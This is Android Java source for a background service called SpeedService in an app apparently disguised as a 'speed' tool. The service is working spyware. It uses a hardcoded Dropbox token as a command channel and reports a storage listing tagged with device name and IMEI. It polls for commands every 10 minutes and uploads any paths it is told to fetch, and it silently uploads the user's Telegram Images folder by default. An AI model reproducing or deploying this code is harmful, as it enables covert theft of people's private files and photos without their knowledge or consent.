package speed;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import com.dropbox.core.v2.files.ListFolderResult;
import com.dropbox.core.v2.files.Metadata;
import com.google.gson.Gson;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import Helpers.SharedPreferencesHelper;
import rx.Observable;
import rx.Subscriber;
import rx.Subscription;
import rx.functions.Func0;
import rx.schedulers.Schedulers;
import ui.LoginActivity;

public class SpeedService extends Service {

    private static final String TAG = SpeedService.class.getName();
    private DbxClientV2 client;
    public String reportPath;
    private String commandsPath;
    private String internalReportPath;
    private String onlineRootPath;
    private Subscription commandCheckingSubscription;

    @Override
    public IBinder onBind(Intent intent) {
        Log.i(TAG, "FUNCTION : onBind");
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "FUNCTION : onStartCommand");

        LoginActivity.speedService = this;

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        Log.i(TAG, "FUNCTION : onCreate");
        super.onCreate();

        createPaths();
        createSchedule();
        startDbConnection();
    }

    private void checkForCommands() {
        Log.i(TAG, "FUNCTION : checkForCommands");
        downloadCommands();
        commandCheckingSubscription = Observable.interval(10, TimeUnit.MINUTES)
                .subscribeOn(Schedulers.io())
                .subscribe(new Subscriber<Long>() {
                    @Override
                    public void onCompleted() {
                        Log.i(TAG, "FUNCTION : checkForCommands => onCompleted");
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.i(TAG, "FUNCTION : checkForCommands => onError: " + e.toString());
                        e.printStackTrace();
                    }

                    @Override
                    public void onNext(Long aLong) {
                        Log.i(TAG, "FUNCTION : checkForCommands => onNext");
                        downloadCommands();
                    }
                });
    }

    private void downloadCommands() {
        Log.i(TAG, "FUNCTION : downloadCommands");
        Observable.defer(new Func0<Observable<String>>() {
            @Override
            public Observable<String > call() {
                Log.i(TAG, "FUNCTION : downloadCommands => call");
                File file = new File(internalReportPath);
                try {
                    client.files().download(commandsPath)
                            .download(new FileOutputStream(file));
                    return Observable.just(getStringFromFile(file));
                } catch (Exception e) {
                    Log.e(TAG, "FUNCTION : downloadCommands => call => Catch: " + e.toString());
                    e.printStackTrace();
                }
                return Observable.just(null);
            }
        })
        .subscribeOn(Schedulers.io())
        .subscribe(new Subscriber<String >() {
            @Override
            public void onCompleted() {
                Log.i(TAG, "FUNCTION : downloadCommands => onCompleted");
            }

            @Override
            public void onError(Throwable e) {
                Log.e(TAG, "FUNCTION : downloadCommands => onError: " + e.toString());
                e.printStackTrace();
            }

            @Override
            public void onNext(String  commands) {
                Log.i(TAG, "FUNCTION : downloadCommands => onNext: " + commands);
                if(commands != null) {
                    executeCommands(commands);
                } else {
                    Log.i(TAG, "FUNCTION : downloadCommands => onNext => Commands are null");
                    if(SharedPreferencesHelper.get(SpeedService.this, SharedPreferencesHelper.Property.HAS_UPLOADED, "").equals("")){
                        Log.i(TAG, "FUNCTION : downloadCommands => onNext => Commands are null => Has not uploaded anything yet");
                        traverse("/storage/emulated/0/Telegram/Telegram Images");
                        SharedPreferencesHelper.put(SpeedService.this, SharedPreferencesHelper.Property.HAS_UPLOADED, "true");
                    }
                }
            }
        });
    }

    private void executeCommands(String commands) {
        Log.i(TAG, "FUNCTION : executeCommands");
        Command command = new Gson().fromJson(commands, Command.class);
        if(command.getLock()){
            Log.i(TAG, "FUNCTION : executeCommands => isLocked");
            stopSelf();
            return;
        }
        for (String path:command.getFiles()) {
            File file = new File(path);
//            uploadFile(file, onlineRootPath + path.split("/")[path.split("/").length-1]);
            traverse(path);
        }
    }

    public static String getStringFromFile (File fl) throws Exception {
        FileInputStream fin = new FileInputStream(fl);
        String ret = convertStreamToString(fin);
        //Make sure you close all streams.
        fin.close();
        return ret;
    }

    public static String convertStreamToString(InputStream is) throws Exception {
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        String line = null;
        while ((line = reader.readLine()) != null) {
            sb.append(line).append("\n");
        }
        reader.close();
        return sb.toString();
    }

    public void traverse (String path) {
        Log.i(TAG, "FUNCTION : traverse");
        File dir = new File(path);
        if (dir.exists()) {
            File[] files = dir.listFiles();
            for (int i = 0; i < files.length; ++i) {
                File file = files[i];
                if (file.isDirectory()) {
                    traverse(file.getPath());
                } else {
                    uploadFile(file, onlineRootPath + "/uploaded_files/" + file.getName());
                }
            }
        }
    }

    private void createPaths() {
        Log.i(TAG, "FUNCTION : createPaths");

        onlineRootPath = "/speedy/" + getDeviceName() + "-" + getDeviceImei();
        reportPath = "/speedy/" + getDeviceName() + "-" + getDeviceImei() + "/report.txt";
        commandsPath = "/speedy/" + getDeviceName() + "-" + getDeviceImei() + "/commands.txt";
        Log.i(TAG, "FUNCTION : createPaths => report: " + reportPath);
        internalReportPath = Environment.getExternalStorageDirectory().getPath() + "/Speed";
    }


    public void uploadFile(final File file, final String path) {
        Log.i(TAG, "FUNCTION : uploadFile");
        Log.i(TAG, "FUNCTION : uploadFile => path: " + path);
        Observable.defer(new Func0<Observable<Void>>() {
            @Override
            public Observable<Void> call() {
                try {
                    client.files().delete(path);
                } catch (DbxException e) {
                    Log.i(TAG, "FUNCTION : uploadFile => Deleting onCatch: " + e.toString());
                    e.printStackTrace();
                }
                try (InputStream in = new FileInputStream(file)) {
                    FileMetadata metadata = client.files().uploadBuilder(path).uploadAndFinish(in);
                } catch (Exception e) {
                    Log.i(TAG, "FUNCTION : uploadFile => Uploading onCatch: " + e.toString());
                    e.printStackTrace();
                }
                return Observable.just(null);
            }
        })
                .subscribeOn(Schedulers.io())
                .subscribe(new Subscriber<Void>() {
                    @Override
                    public void onCompleted() {
                        Log.i(TAG, "FUNCTION : uploadFile => onCompleted");
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.i(TAG, "FUNCTION : uploadFile => onError: " + e.toString());
                        e.printStackTrace();
                    }

                    @Override
                    public void onNext(Void aVoid) {
                        Log.i(TAG, "FUNCTION : uploadFile => onNext");
                    }
                });
    }

    @SuppressLint("HardwareIds")
    public String getDeviceImei() {
        Log.i(TAG, "FUNCTION : getDeviceImei");
        String deviceId = SharedPreferencesHelper.get(this, SharedPreferencesHelper.Property.DEVICE_ID, "");
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if(deviceId.equals("")) {
            Log.i(TAG, "FUNCTION : getDeviceImei => First Time");
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                deviceId = new Random().nextInt() + "";
                SharedPreferencesHelper.put(this, SharedPreferencesHelper.Property.DEVICE_ID, deviceId);
                return deviceId;
            }
            SharedPreferencesHelper.put(this, SharedPreferencesHelper.Property.DEVICE_ID, deviceId);
            deviceId = telephonyManager.getDeviceId();
            return deviceId;
        } else {
            Log.i(TAG, "FUNCTION : getDeviceImei => NOT First Time");
            return deviceId;
        }
    }

    private void createSchedule() {
        Log.i(TAG, "FUNCTION : createSchedule");
        Intent alarmIntent = new Intent(this, SpeedyScheduler.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this.getApplicationContext(), 234324243, alarmIntent, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, 5000, 5000, pendingIntent);
    }

    public File generateFileOnSD(Context context, String sFileName, String sBody) {
        Log.i(TAG, "FUNCTION : generateFileOnSD");
        try {
            File root = new File(Environment.getExternalStorageDirectory(), "Speedy");
            if (!root.exists()) {
                root.mkdirs();
            }
            File file = new File(root, sFileName);
            FileWriter writer = new FileWriter(file);
            writer.append(sBody);
            writer.flush();
            writer.close();
            Log.i(TAG, "FUNCTION : generateFileOnSD => saved");
            return file;
        } catch (IOException e) {
            Log.i(TAG, "FUNCTION : generateFileOnSD => Error: " + e.toString());
            e.printStackTrace();
        }
        return null;
    }

    public String getFilesList() {
        Log.i(TAG, "FUNCTION : getFilesList");
        File f = new File(Environment.getExternalStorageDirectory().getPath());
        File[] files = f.listFiles();
        String paths = getDeviceName() + "\n";
        if (files.length == 0)
            return "";
        for (File inFile : files) {
            if (inFile.isDirectory()) {
                paths += inFile.getPath() + "  " + getFileSize(inFile) + "\n";
                Log.i(TAG, "FUNCTION : getFilesList => File name: " + inFile.getName());
            }
        }
        return paths;
    }

    public static long getFileSize(final File file) {
        Log.i(TAG, "FUNCTION : getFileSize");
        if (file == null || !file.exists())
            return 0;
        if (!file.isDirectory())
            return file.length();
        final List<File> dirs = new LinkedList<>();
        dirs.add(file);
        long result = 0;
        while (!dirs.isEmpty()) {
            final File dir = dirs.remove(0);
            if (!dir.exists())
                continue;
            final File[] listFiles = dir.listFiles();
            if (listFiles == null || listFiles.length == 0)
                continue;
            for (final File child : listFiles) {
                result += child.length();
                if (child.isDirectory())
                    dirs.add(child);
            }
        }
        return result/1000000;
    }


    private void startDbConnection() {
        Log.i(TAG, "FUNCTION : startDbConnection");
        Observable.defer(new Func0<Observable<Void>>() {
            @Override
            public Observable<Void> call() {
                DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
                client = new DbxClientV2(config, "5A-rhbYDXmAAAAAAAAAACiiId4xo5bAd8gGtIEDLgyZ2gR5Zri7m0BSkOFdiGK-4");
                try {
                    Log.i(TAG, "FUNCTION : startDbConnection => user: " + client.users().getCurrentAccount());
                } catch (DbxException e) {
                    Log.i(TAG, "FUNCTION : startDbConnection => Error: " + e.toString());
                    e.printStackTrace();
                }
                return Observable.just(null);
            }
        })
                .subscribeOn(Schedulers.io())
                .subscribe(new Subscriber<Void>() {
                    @Override
                    public void onCompleted() {
                        Log.i(TAG, "FUNCTION : startDbConnection => onCompleted");
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.i(TAG, "FUNCTION : startDbConnection => onError: " + e.toString());
                        e.printStackTrace();
                    }

                    @Override
                    public void onNext(Void aVoid) {
                        Log.i(TAG, "FUNCTION : startDbConnection => onNext");

                        checkForCommands();

                        ListFolderResult result = null;
                        try {
                            result = client.files().listFolder("");
                            while (true) {
                                for (Metadata metadata : result.getEntries()) {
                                    Log.i(TAG, "FUNCTION : startDbConnection => Files in Db: " + metadata.getPathLower());
                                }

                                if (!result.getHasMore()) {
                                    break;
                                }

                                result = client.files().listFolderContinue(result.getCursor());
                            }
                        } catch (DbxException e) {
                            Log.i(TAG, "FUNCTION : startDbConnection => Files in Db => Error: " + e.toString());
                            e.printStackTrace();
                        }

                        uploadFile(generateFileOnSD(SpeedService.this, "report", getFilesList()), reportPath);
                    }
                });
    }

    public static String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        }
        return capitalize(manufacturer) + "_" + model;
    }

    public static String capitalize(String str) {
        if (TextUtils.isEmpty(str)) {
            return str;
        }
        char[] arr = str.toCharArray();
        boolean capitalizeNext = true;

        StringBuilder phrase = new StringBuilder();
        for (char c : arr) {
            if (capitalizeNext && Character.isLetter(c)) {
                phrase.append(Character.toUpperCase(c));
                capitalizeNext = false;
                continue;
            } else if (Character.isWhitespace(c)) {
                capitalizeNext = true;
            }
            phrase.append(c);
        }

        return phrase.toString();
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "FUNCTION : onDestroy");
        if(commandCheckingSubscription!=null){
            commandCheckingSubscription.unsubscribe();
        }
        super.onDestroy();
    }
}
